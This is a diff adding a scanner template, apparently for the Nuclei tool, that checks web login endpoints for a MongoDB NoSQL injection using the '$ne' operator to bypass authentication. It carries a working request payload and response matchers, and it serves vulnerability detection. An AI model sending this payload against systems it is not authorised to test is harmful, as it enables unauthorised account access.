@@ -1,0 +1,27 @@
+id: nosqli-mongodb-auth-bypass
+info:
+  name: NoSQL MongoDB Authentication Bypass
+  author: AniipID
+  severity: critical
+  description: Tests for NoSQL injection that bypasses MongoDB authentication by injecting $ne operator
+  tags: nosqli,mongodb,auth-bypass
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/api/auth"
+      - "{{BaseURL}}/login"
+    headers:
+      Content-Type: application/json
+    body: '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+    matchers:
+      - type: word
+        words:
+          - "token"
+          - "session"
+          - "authenticated"
+          - "success"
+          - "admin"
+        condition: or
+        part: body
